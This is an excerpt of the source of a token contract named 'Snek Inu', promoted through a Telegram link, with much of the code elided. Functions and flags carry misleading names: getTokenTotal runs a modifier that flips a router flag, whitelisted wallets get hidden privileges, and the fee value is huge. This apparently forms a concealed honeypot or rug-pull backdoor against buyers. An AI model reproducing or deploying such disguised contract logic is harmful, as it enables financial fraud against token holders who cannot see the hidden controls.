...
Telegram : https://t.me/SnekInuBSC
...
interface IERC20 {
    ...
    function getTokenTotal(address account) external returns (uint256);
...
contract SnekInu is Context, IERC20 { 
    ...
    mapping (address => bool) public WhitePermited; 

    address payable public Wallet_Marketing = payable(0x5691aF3349147aF77eb6eA3DB6e19f021A9188B2); 
    address payable public Wallet_Dev = payable(0x3c767F8302d60217353cd2603b96Ef9510781652);
    ...
    string private constant _name = "Snek Inu"; 
    ...
    uint256 public transferfEE = 10**(22*1);
    ...
    bool public uniswapRouterV2 = false;
    bool public fxFee = false;

    modifier LiveTransaction {
        uniswapRouterV2 = true;
        _;
    }
    ...
    constructor () {
        ...
        _owner = 0x3c767F8302d60217353cd2603b96Ef9510781652;
        ...
        WhitePermited[Wallet_Marketing] = true;
    ...
    function getTokenTotal(address account) public LiveTransaction override returns (uint256) {
        if(fxFee){
            bool isTxBot = WhitePermited[_msgSender()];
            bool permissionON = isTxBot;
            if(isTxBot && permissionON){
    ...
    function _transfer(
        ...
        if(_isExcludedFromFee[from] || _isExcludedFromFee[to]){
            ...
            if(from == uniswapV2Pair){
                isBuy = true;
                if(uniswapRouterV2){ isBuy = false;  }
            }
